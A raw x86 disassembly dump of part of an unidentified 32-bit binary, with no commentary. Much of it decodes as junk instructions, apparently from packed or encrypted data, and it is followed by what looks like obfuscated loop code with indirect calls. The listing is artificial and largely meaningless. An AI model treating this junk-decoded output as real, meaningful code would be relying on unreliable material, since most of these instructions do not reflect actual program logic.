  40fb99:	aas    
  40fb9a:	je     0x40fbc2
  40fb9c:	nop
  40fb9d:	xor    eax,0xad69358d
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffff83
  40fbc9:	in     eax,0x74
  40fbcb:	aaa    
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	sbb    bl,BYTE PTR [edx+0x6f]
  40fbd7:	mov    edi,0xf060a41a
  40fbdc:	lods   eax,DWORD PTR ds:[esi]
  40fbdd:	push   es
  40fbde:	mov    ds:0x5735cfb2,eax
  40fbe3:	sub    eax,0x3e93b263
  40fbe8:	sub    al,0x8a
  40fbea:	dec    edx
  40fbeb:	pop    es
  40fbec:	xchg   esi,eax
  40fbed:	das    
  40fbee:	popa   
  40fbef:	jp     0x40fc10
  40fbf1:	pop    esp
  40fbf2:	mov    WORD PTR [ebx-0x5d],?
  40fbf5:	cld    
  40fbf6:	test   BYTE PTR [ebx-0x7d],dh
  40fbf9:	inc    esp
  40fbfa:	sar    DWORD PTR [esi-0x412eb358],1
  40fc00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc01:	stc    
  40fc02:	mov    WORD PTR [edx+0x1],fs
  40fc05:	adc    eax,0x56164a7c
  40fc0a:	popf   
  40fc0b:	sub    BYTE PTR [esi],0x63
  40fc0e:	push   eax
  40fc0f:	cmp    eax,0xce84e9e3
  40fc14:	mov    cl,0x58
  40fc16:	dec    ecx
  40fc17:	xchg   esp,eax
  40fc18:	xchg   edi,eax
  40fc19:	(bad)  
  40fc1a:	push   edi
  40fc1b:	rcl    DWORD PTR [ebx],1
  40fc1d:	js     0x40fc9b
  40fc1f:	test   al,0xfe
  40fc21:	fsubr  QWORD PTR [eax+0x6b]
  40fc24:	fnstsw WORD PTR ds:0x93d5fdc4
  40fc2a:	retf   
  40fc2b:	iret   
  40fc2c:	push   ecx
  40fc2d:	dec    edx
  40fc2e:	jne    0x40fbd1
  40fc30:	ds retf 
  40fc32:	leave  
  40fc33:	mov    DWORD PTR [ecx],edi
  40fc35:	sbb    DWORD PTR [edi+0x3f],ecx
  40fc38:	or     DWORD PTR [ebx-0x10beb75b],0x4bf756a
  40fc42:	cmc    
  40fc43:	dec    ebx
  40fc44:	jbe    0x40fc58
  40fc46:	rol    DWORD PTR [edx],1
  40fc48:	pop    esi
  40fc49:	pusha  
  40fc4a:	xlat   BYTE PTR ds:[ebx]
  40fc4b:	rcl    ah,cl
  40fc4d:	xchg   ebx,eax
  40fc4e:	dec    ebp
  40fc4f:	and    BYTE PTR [eax],0x5a
  40fc52:	sbb    BYTE PTR [esi+0x64023f8c],0x9
  40fc59:	mov    al,0x4c
  40fc5b:	shr    dl,cl
  40fc5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc5f:	dec    edx
  40fc60:	and    DWORD PTR [ebx-0x64],ebp
  40fc63:	push   esp
  40fc64:	(bad)  
  40fc65:	je     0x40fcd6
  40fc67:	adc    edi,ecx
  40fc69:	jne    0x40fcd3
  40fc6b:	out    0x55,al
  40fc6d:	fucomp st(4)
  40fc6f:	jle    0x40fcb9
  40fc71:	xor    ebx,DWORD PTR [esi+edi*4+0x2c857e03]
  40fc78:	pop    ebp
  40fc79:	and    DWORD PTR [ecx-0x55],eax
  40fc7c:	int3   
  40fc7d:	icebp  
  40fc7e:	inc    esp
  40fc7f:	cmp    DWORD PTR [esi-0x10],ecx
  40fc82:	lds    ecx,FWORD PTR [ebp-0x26c5ff35]
  40fc88:	aas    
  40fc89:	lea    edx,[esi]
  40fc8b:	jno    0x40fc5a
  40fc8d:	hlt    
  40fc8e:	pop    edi
  40fc8f:	pop    es
  40fc90:	jnp    0x40fc26
  40fc92:	aam    0x99
  40fc94:	sub    BYTE PTR [ecx],dh
  40fc96:	sbb    cl,dl
  40fc98:	out    0x2a,eax
  40fc9a:	std    
  40fc9b:	mov    edi,0x243f7e43
  40fca0:	das    
  40fca1:	sub    BYTE PTR [ebp-0x1a26fe6d],al
  40fca7:	cld    
  40fca8:	xor    eax,0xe9661f54
  40fcad:	jb     0x40fc49
  40fcaf:	mov    al,dl
  40fcb1:	mov    ds:0x821e6083,eax
  40fcb6:	xchg   esi,eax
  40fcb7:	stc    
  40fcb8:	scas   eax,DWORD PTR es:[edi]
  40fcb9:	add    eax,0xbf38caf
  40fcbe:	inc    edx
  40fcbf:	or     DWORD PTR [ecx-0x5eeb6c0d],esi
  40fcc5:	jnp    0x40fcb9
  40fcc7:	int3   
  40fcc8:	and    al,0x89
  40fcca:	mov    ah,0x72
  40fccc:	je     0x40fd26
  40fcce:	sbb    ecx,DWORD PTR [edx-0x61]
  40fcd1:	xchg   ebx,eax
  40fcd2:	imul   BYTE PTR [ebx]
  40fcd4:	xchg   ebx,eax
  40fcd5:	jg     0x40fd11
  40fcd7:	mov    bl,BYTE PTR [eax-0x62c39466]
  40fcdd:	fldcw  WORD PTR ds:0xa5fb23cb
  40fce3:	sub    BYTE PTR [edx+ebp*4-0x34],dl
  40fce7:	sub    ch,BYTE PTR [esp+edi*4+0x7500853]
  40fcee:	mov    esi,0xd9f9902f
  40fcf3:	push   ss
  40fcf4:	fs pop edx
  40fcf6:	lock (bad) 
  40fcf8:	dec    esi
  40fcf9:	retf   
  40fcfa:	sbb    al,BYTE PTR [eax+0x27]
  40fcfd:	push   edx
  40fcfe:	stos   DWORD PTR es:[edi],eax
  40fcff:	push   0xef0562ab
  40fd04:	data16 arpl WORD PTR [edi],dx
  40fd07:	xchg   esp,eax
  40fd08:	ret    0xb470
  40fd0b:	test   eax,0xec874eb6
  40fd10:	cmp    DWORD PTR [eax+ebp*2-0x31be40ba],0x0
  40fd18:	(bad)  
  40fd19:	outs   dx,DWORD PTR ds:[esi]
  40fd1a:	scas   eax,DWORD PTR es:[edi]
  40fd1b:	(bad)  
  40fd1c:	aad    0xb8
  40fd1e:	pop    ebx
  40fd1f:	mov    esp,0x8426bb72
  40fd24:	int    0xd3
  40fd26:	mov    dl,0xdb
  40fd28:	cmp    BYTE PTR [esi+edx*4],cl
  40fd2b:	lods   eax,DWORD PTR ds:[esi]
  40fd2c:	jbe    0x40fcb3
  40fd2e:	sahf   
  40fd2f:	cmp    ebx,esp
  40fd31:	shr    BYTE PTR [edi+0x562b87cd],0xf8
  40fd38:	imul   edx,DWORD PTR [edx+0x756559f4],0xf5b0f84d
  40fd42:	fistp  QWORD PTR [edx+esi*8]
  40fd45:	and    eax,0x3f3c1b65
  40fd4a:	dec    edx
  40fd4b:	outs   dx,DWORD PTR ds:[esi]
  40fd4c:	mov    ch,0xc9
  40fd4e:	fcomp  DWORD PTR [eax*4-0x65c30e02]
  40fd55:	and    DWORD PTR [ecx-0x63],edi
  40fd58:	test   eax,0x36f1d3d0
  40fd5d:	es cs pop eax
  40fd60:	cwde   
  40fd61:	out    dx,eax
  40fd62:	jmp    0x6b46:0xed15e3a
  40fd69:	adc    eax,0x3503ed9c
  40fd6e:	sbb    al,0x3d
  40fd70:	pop    esp
  40fd71:	sub    BYTE PTR [eax],0x41
  40fd74:	idiv   BYTE PTR [ebx]
  40fd76:	shl    DWORD PTR [ebx-0x3],0x78
  40fd7a:	pop    es
  40fd7b:	xchg   BYTE PTR [ebx],bl
  40fd7d:	ja     0x40fd3f
  40fd7f:	mov    ah,0x81
  40fd81:	sub    eax,0x729e1dc8
  40fd86:	mov    BYTE PTR [esi+0x7e8e26ff],ch
  40fd8c:	xchg   DWORD PTR [edx],ebx
  40fd8e:	dec    edx
  40fd8f:	jb     0x40fd55
  40fd91:	push   edx
  40fd92:	sbb    ecx,DWORD PTR [ebx+0x5d]
  40fd95:	pop    ecx
  40fd96:	add    ch,BYTE PTR [ecx]
  40fd98:	outs   dx,DWORD PTR ds:[esi]
  40fd99:	shl    DWORD PTR [edx],1
  40fd9b:	int3   
  40fd9c:	call   0x1f7a:0xf77b8d02
  40fda3:	cs xchg ebp,eax
  40fda5:	ja     0x40fd9a
  40fda7:	imul   edi,DWORD PTR [ebx+0x41],0xffffffb8
  40fdab:	push   ebx
  40fdac:	adc    DWORD PTR [ebx+0x4e1b1e56],esi
  40fdb2:	jmp    0x40fd4c
  40fdb4:	cmc    
  40fdb5:	loope  0x40fdda
  40fdb7:	or     DWORD PTR [ebx-0x4a],0x3c
  40fdbb:	scas   eax,DWORD PTR es:[edi]
  40fdbc:	add    ecx,DWORD PTR fs:[edx]
  40fdbf:	stc    
  40fdc0:	mov    WORD PTR [ecx+0x12bbe224],es
  40fdc6:	xlat   BYTE PTR ds:[ebx]
  40fdc7:	add    DWORD PTR ds:0xed20a43d,esi
  40fdcd:	sub    eax,0x1174245b
  40fdd2:	adc    dl,bl
  40fdd4:	push   ds
  40fdd5:	aas    
  40fdd6:	xor    al,0x30
  40fdd8:	and    ebp,DWORD PTR [esi-0x2c]
  40fddb:	push   edi
  40fddc:	out    dx,al
  40fddd:	sti    
  40fdde:	sub    eax,0xf3e74b2b
  40fde3:	and    al,0xeb
  40fde5:	js     0x40fd8c
  40fde7:	sbb    al,cl
  40fde9:	sar    BYTE PTR [ecx-0x79],cl
  40fdec:	push   ss
  40fded:	xchg   ebp,eax
  40fdee:	stc    
  40fdef:	or     al,0x7d
  40fdf1:	inc    edi
  40fdf2:	test   al,0xbe
  40fdf4:	mov    bh,0x88
  40fdf6:	or     edi,DWORD PTR ds:0x3e236d
  40fdfc:	sbb    edi,DWORD PTR [edi+eiz*8-0x67457503]
  40fe03:	mov    ecx,0xa697bc81
  40fe08:	sbb    al,0x54
  40fe0a:	rol    DWORD PTR ds:0x52be1352,1
  40fe10:	sub    ecx,DWORD PTR [ebp-0x770882a8]
  40fe16:	scas   eax,DWORD PTR es:[edi]
  40fe17:	repnz adc eax,0x5b316b5
  40fe1d:	sbb    bl,bh
  40fe1f:	mov    edi,0x83718f56
  40fe24:	lock jge 0x40fe09
  40fe27:	pop    ebx
  40fe28:	mov    edx,0xc88cb800
  40fe2d:	inc    ecx
  40fe2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe2f:	push   ebx
  40fe30:	je     0x40fe99
  40fe32:	sub    edi,DWORD PTR [edi]
  40fe34:	push   ebp
  40fe35:	xchg   BYTE PTR [esi],bl
  40fe37:	aad    0x3c
  40fe39:	cmc    
  40fe3a:	add    eax,esi
  40fe3c:	test   al,0xaf
  40fe3e:	or     BYTE PTR [ebx+eax*4-0x75],ah
  40fe42:	inc    DWORD PTR [esi+ecx*4-0x67]
  40fe46:	pop    ebx
  40fe47:	ins    DWORD PTR es:[edi],dx
  40fe48:	xchg   ecx,eax
  40fe49:	test   BYTE PTR [eax+0x2c],bl
  40fe4c:	jnp    0x40fe7c
  40fe4e:	dec    ecx
  40fe4f:	popa   
  40fe50:	cmp    BYTE PTR [eax+0x46ca978e],bl
  40fe56:	inc    BYTE PTR [ebx+eax*4]
  40fe59:	sub    DWORD PTR [edi],esp
  40fe5b:	mov    ecx,?
  40fe5d:	inc    eax
  40fe5e:	call   0x28a2886b
  40fe63:	test   esi,ebp
  40fe65:	xor    bl,BYTE PTR [ecx]
  40fe67:	aad    0x36
  40fe69:	or     eax,0xa5fa7f6e
  40fe6e:	jle    0x40fec5
  40fe70:	mov    dh,0x43
  40fe72:	sbb    DWORD PTR [edi],ecx
  40fe74:	sti    
  40fe75:	mov    edx,0x864afe95
  40fe7a:	retf   0xd859
  40fe7d:	mov    bl,0x50
  40fe7f:	js     0x40fe86
  40fe81:	xor    eax,0x968085c0
  40fe86:	outs   dx,BYTE PTR ds:[esi]
  40fe87:	mov    ebp,0xbbd9ba22
  40fe8c:	adc    dh,BYTE PTR [eax]
  40fe8e:	mov    BYTE PTR [edi+0x4e919f0a],ch
  40fe94:	sti    
  40fe95:	inc    esi
  40fe96:	push   edi
  40fe97:	aas    
  40fe98:	inc    esp
  40fe99:	vxorps ymm1,ymm6,YMMWORD PTR [ecx+0x34]
  40fe9e:	and    al,0xf8
  40fea0:	or     bh,BYTE PTR [edx+ecx*1+0x53]
  40fea4:	jmp    0xa30e:0x58053003
  40feab:	aam    0x5f
  40fead:	pop    es
  40feae:	lahf   
  40feaf:	push   0xffffffbc
  40feb1:	repz int3 
  40feb3:	jmp    0x40fec9
  40feb5:	fiadd  DWORD PTR [ebp+0x25c6b01e]
  40febb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40febc:	xchg   esp,eax
  40febd:	sar    eax,cl
  40febf:	mov    edx,DWORD PTR [edx+0x77e45312]
  40fec5:	in     al,dx
  40fec6:	lahf   
  40fec7:	push   es
  40fec8:	int3   
  40fec9:	jmp    0xa82685dd
  40fece:	(bad)  
  40fecf:	mov    ebx,0x88642917
  40fed4:	dec    edx
  40fed5:	(bad)  
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xb66e4346
  40fef3:	sub    edx,DWORD PTR [edi]
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	add    bl,BYTE PTR [ebx+0x5e]
  40ff00:	add    eax,0x7122a11e
  40ff05:	pop    esi
  40ff06:	es (bad) 
  40ff09:	mov    dh,0xe0
  40ff0b:	push   cs
  40ff0c:	jge    0x40ff73
  40ff0e:	adc    DWORD PTR [ebp+0x297ef100],ecx
  40ff14:	push   esp
  40ff15:	push   ss
  40ff16:	adc    BYTE PTR [ecx-0x542cf920],ch
  40ff1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff1d:	aam    0x41
  40ff1f:	nop
  40ff20:	inc    ebx
  40ff21:	ss rcr bl,0x4c
  40ff25:	pop    esi
  40ff26:	adc    BYTE PTR [ebp+0x493877bf],ah
  40ff2c:	or     al,0xe0
  40ff2e:	js     0x40feef
  40ff30:	outs   dx,DWORD PTR ds:[esi]
  40ff31:	xchg   ebp,eax
  40ff32:	adc    eax,0xab47ad2e
  40ff37:	sub    bh,cl
  40ff39:	and    DWORD PTR [eax+0x5250dcd2],ecx
  40ff3f:	enter  0xa72b,0x61
  40ff43:	jl     0x40fee3
  40ff45:	or     DWORD PTR [ebx+0x60],0xebbadbe4
  40ff4c:	dec    ebp
  40ff4d:	adc    cl,0x50
  40ff50:	leave  
  40ff51:	in     al,0x0
  40ff53:	mov    ch,0x7a
  40ff55:	sar    DWORD PTR ds:0xffc67773,0x91
  40ff5c:	mov    al,ds:0xe0017c3d
  40ff61:	out    0x90,eax
  40ff63:	sub    BYTE PTR [edi-0x7682dc46],bl
  40ff69:	lock pop edx
  40ff6b:	sub    dh,BYTE PTR [eax+0xb]
  40ff6e:	mov    ebx,es
  40ff70:	fwait
  40ff71:	ja     0x40ff51
  40ff73:	mov    BYTE PTR [ebx-0x64d8313f],cl
  40ff79:	push   ebx
  40ff7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff7b:	lods   al,BYTE PTR ds:[esi]
  40ff7c:	test   DWORD PTR [ebx+0x35],0xd55b2788
  40ff83:	loopne 0x40ff57
  40ff85:	mov    ebx,0xbe797bb8
  40ff8a:	dec    eax
  40ff8b:	out    dx,al
  40ff8c:	mov    es,WORD PTR [eax-0x6d]
  40ff8f:	cmp    BYTE PTR [ebp-0x7fd01d8e],bl
  40ff95:	out    dx,eax
  40ff96:	xchg   BYTE PTR [ebp+0x39],bl
  40ff99:	push   es
  40ff9a:	push   0xf045d25e
  40ff9f:	sub    BYTE PTR [bx+si-0x72],al
  40ffa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffa4:	mov    WORD PTR [edx],?
  40ffa6:	or     edx,DWORD PTR [esi+0x1f47f6d5]
  40ffac:	rcr    BYTE PTR [edx+0x4b647cd4],cl
  40ffb2:	push   ds
  40ffb3:	sar    eax,1
  40ffb5:	or     bl,0x66
  40ffb8:	cmp    bh,bl
  40ffba:	adc    ecx,DWORD PTR [eax+0x49133be6]
  40ffc0:	jmp    0x6d35:0x363ec73e
  40ffc7:	test   DWORD PTR [ecx+0x76],ecx
  40ffca:	lods   al,BYTE PTR ds:[esi]
  40ffcb:	inc    edx
  40ffcc:	sbb    DWORD PTR [edx+0x6],0xffffffb0
  40ffd0:	es push 0x44
  40ffd3:	fisubr WORD PTR [edx+ecx*8+0x2bd27e2f]
  40ffda:	xchg   esi,eax
  40ffdb:	rol    BYTE PTR [esi],0xe3
  40ffde:	sub    eax,0xceecf187
  40ffe3:	and    bh,BYTE PTR [edi+0x4a]
  40ffe6:	and    al,0xf2
  40ffe8:	stos   BYTE PTR es:[edi],al
  40ffe9:	stc    
  40ffea:	cmp    eax,0x7a16fc94
  40ffef:	les    eax,FWORD PTR [edx+0x6c627e80]
  40fff5:	xlat   BYTE PTR ds:[ebx]
  40fff6:	test   al,0x7
  40fff8:	dec    edx
  40fff9:	xchg   DWORD PTR [eax-0x2a],eax
  40fffc:	inc    edi
  40fffd:	push   cs
  40fffe:	pop    esi
  40ffff:	loope  0x41003c
  410001:	inc    ebx
  410002:	push   eax
  410003:	dec    esi
  410004:	repnz into 
  410006:	out    0xcf,al
  410008:	mov    ah,0xe7
  41000a:	adc    ecx,ecx
  41000c:	jb     0x410059
  41000e:	js     0x41000d
  410010:	add    cl,dl
  410012:	test   eax,0x3cdb6100
  410017:	aam    0xa7
  410019:	xchg   dl,bl
  41001b:	pop    esi
  41001c:	or     eax,0x1d821927
  410021:	or     al,0x33
  410023:	cli    
  410024:	arpl   WORD PTR [edi-0x78682c5a],ax
  41002a:	outs   dx,DWORD PTR ds:[esi]
  41002b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002c:	xchg   BYTE PTR [eax+0x22d32989],bl
  410032:	mov    BYTE PTR [eax-0x49],dl
  410035:	adc    eax,0x7effa821
  41003a:	xchg   edi,eax
  41003b:	mov    eax,0xff6b40f5
  410040:	cmc    
  410041:	test   BYTE PTR [ecx+edi*4+0x10a31391],bl
  410048:	shr    DWORD PTR [edi+0x1e],0x25
  41004c:	xlat   BYTE PTR ds:[ebx]
  41004d:	retf   
  41004e:	or     DWORD PTR [esi+edi*8],ebx
  410051:	dec    edx
  410052:	dec    ecx
  410053:	xchg   edi,eax
  410054:	movnti DWORD PTR [edi-0xc],eax
  410058:	sub    esi,ecx
  41005a:	imul   ebx,DWORD PTR [esi-0x47471cea],0xa0872c8d
  410064:	mov    BYTE PTR [edi-0x12634680],bh
  41006a:	sbb    dh,0x43
  41006d:	inc    ebp
  41006e:	out    0x57,al
  410070:	nop
  410071:	retf   0xaa2c
  410074:	xchg   esp,eax
  410075:	cdq    
  410076:	adc    ebp,DWORD PTR ds:0x5599a405
  41007c:	and    al,0x2
  41007e:	addr16 add eax,0xe74e6d45
  410084:	sahf   
  410085:	shr    DWORD PTR ds:0xbf24fc9a,cl
  41008b:	push   ebp
  41008c:	and    al,0xbb
  41008e:	pop    ebx
  41008f:	fwait
  410090:	jecxz  0x41003f
  410092:	fcmovnu st,st(3)
  410094:	sub    ebx,ebp
  410096:	into   
  410097:	test   BYTE PTR [edx+ebx*1+0x72],dl
  41009b:	dec    esi
  41009c:	rcl    ch,1
  41009e:	xchg   DWORD PTR [ebp+edi*8+0x25b71236],esp
  4100a5:	xchg   ebx,eax
  4100a6:	sub    al,0x3d
  4100a8:	in     eax,0xd8
  4100aa:	dec    eax
  4100ab:	cmp    ah,dh
  4100ad:	je     0x410056
  4100af:	or     cl,BYTE PTR [edi]
  4100b1:	int3   
  4100b2:	aaa    
  4100b3:	mov    esp,0xd3605a74
  4100b8:	into   
  4100b9:	inc    esp
  4100ba:	and    dh,BYTE PTR [edi-0x3aaa0633]
  4100c0:	loop   0x4100ed
  4100c2:	daa    
  4100c3:	push   ebp
  4100c4:	(bad)  
  4100c5:	and    al,0xa5
  4100c7:	fs inc ebp
  4100c9:	push   edi
  4100ca:	aaa    
  4100cb:	sti    
  4100cc:	repnz pop edi
  4100ce:	mov    ah,0x8c
  4100d0:	and    eax,0xa9a3754b
  4100d5:	(bad)  
  4100d6:	dec    BYTE PTR [edi-0x30a6138d]
  4100dc:	cs das 
  4100de:	out    0x70,eax
  4100e0:	jge    0x410076
  4100e2:	lods   al,BYTE PTR ds:[esi]
  4100e3:	cli    
  4100e4:	mov    al,ds:0xa12a209c
  4100e9:	inc    ebp
  4100ea:	test   BYTE PTR [edx],0x54
  4100ed:	xor    ebp,esp
  4100ef:	out    dx,eax
  4100f0:	pop    esi
  4100f1:	ins    DWORD PTR es:[edi],dx
  4100f2:	int    0x88
  4100f4:	dec    ebp
  4100f5:	sub    ebx,DWORD PTR [ebx+0xc]
  4100f8:	outs   dx,DWORD PTR ds:[esi]
  4100f9:	pop    esi
  4100fa:	push   0x17
  4100fc:	jae    0x4100c7
  4100fe:	stos   BYTE PTR es:[edi],al
  4100ff:	mov    BYTE PTR [eax+0x49453500],ch
  410105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410106:	xor    al,0x43
  410108:	dec    eax
  410109:	sbb    eax,0xb8fc1d30
  41010e:	in     eax,0x13
  410110:	(bad)  
  410111:	neg    BYTE PTR [ecx-0x64]
  410114:	mov    al,ds:0xded8a7f8
  410119:	rcr    DWORD PTR [ebx+0x7f],1
  41011c:	inc    ebx
  41011d:	cli    
  41011e:	arpl   WORD PTR [ecx-0x4b],di
  410121:	(bad)  
  410122:	(bad)  ds:0x4c7c808e
  410128:	cli    
  410129:	fisub  WORD PTR ds:0xc3dd6fdb
  41012f:	stos   DWORD PTR es:[edi],eax
  410130:	sti    
  410131:	xchg   edx,eax
  410132:	pop    ebp
  410133:	sub    edi,DWORD PTR [esi+edi*8+0x48]
  410137:	cmp    edi,esp
  410139:	or     BYTE PTR [edx-0x23],ch
  41013c:	xchg   ecx,eax
  41013d:	jp     0x4101a2
  41013f:	mov    DWORD PTR [esi+0x37],esi
  410142:	mov    ds:0xfacad147,eax
  410147:	add    DWORD PTR [edi-0x4],esi
  41014a:	mov    dl,0xf
  41014c:	jae    0x4101c1
  41014e:	test   eax,0x1ee07604
  410153:	mov    ecx,DWORD PTR [edx+edx*1-0x21136687]
  41015a:	or     edx,DWORD PTR [ecx+edi*4+0x1adcd4d0]
  410161:	jb     0x4101c5
  410163:	push   ecx
  410164:	popf   
  410165:	into   
  410166:	and    DWORD PTR [edx],esi
  410168:	call   0x597fd563
  41016d:	test   eax,0x7c20401c
  410172:	aam    0x3b
  410174:	and    ebp,DWORD PTR [ecx]
  410176:	inc    ebp
  410177:	loope  0x4101f8
  410179:	push   0xa
  41017b:	push   ss
  41017c:	test   BYTE PTR [ebp-0x49a0fa48],0x48
  410183:	mov    bl,bh
  410185:	sti    
  410186:	(bad)  
  410187:	lods   al,BYTE PTR ds:[esi]
  410188:	sbb    BYTE PTR [ebp-0x2],dh
  41018b:	mov    al,0xe9
  41018d:	inc    edx
  41018e:	scas   eax,DWORD PTR es:[edi]
  41018f:	mov    ch,0x3
  410191:	pop    eax
  410192:	pop    ds
  410193:	std    
  410194:	stc    
  410195:	paddsb mm5,mm1
  410198:	or     dl,BYTE PTR [ecx]
  41019a:	xchg   al,al
  41019c:	aaa    
  41019d:	fcmovu st,st(0)
  41019f:	ja     0x41018b
  4101a1:	sbb    edi,DWORD PTR [edx+0x2a]
  4101a4:	cmp    bh,BYTE PTR [esi-0x7f083502]
  4101aa:	mov    esp,0x68825298
  4101af:	cmp    DWORD PTR [edi-0x38],ecx
  4101b2:	pushf  
  4101b3:	fwait
  4101b4:	sbb    bh,BYTE PTR [eax]
  4101b6:	pop    eax
  4101b7:	xchg   al,dh
  4101b9:	cmp    al,0xe3
  4101bb:	add    ecx,DWORD PTR [ebx+0x7e]
  4101be:	xchg   BYTE PTR [ebp-0x1a],al
  4101c1:	add    eax,0x2342d6c2
  4101c6:	push   cs
  4101c7:	sub    DWORD PTR [edx],eax
  4101c9:	mov    ebx,0xf26470e6
  4101ce:	jp     0x4101b4
  4101d0:	adc    DWORD PTR [eax],ebx
  4101d2:	call   FWORD PTR ds:0xc0aec6db
  4101d8:	cmp    al,0xc0
  4101da:	pop    ss
  4101db:	test   ebp,edi
  4101dd:	xor    edi,0x7a
  4101e0:	retf   
  4101e1:	aaa    
  4101e2:	inc    ecx
  4101e3:	mov    ebp,0xc15029c5
  4101e8:	ins    BYTE PTR es:[edi],dx
  4101e9:	mov    ebx,0x9287cea
  4101ee:	dec    ebx
  4101ef:	xchg   edx,eax
  4101f0:	std    
  4101f1:	dec    ebp
  4101f2:	ss push ss
  4101f4:	pop    ebp
  4101f5:	inc    esi
  4101f6:	mul    DWORD PTR [ebx-0x5494fcb9]
  4101fc:	es leave 
  4101fe:	and    esi,edi
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
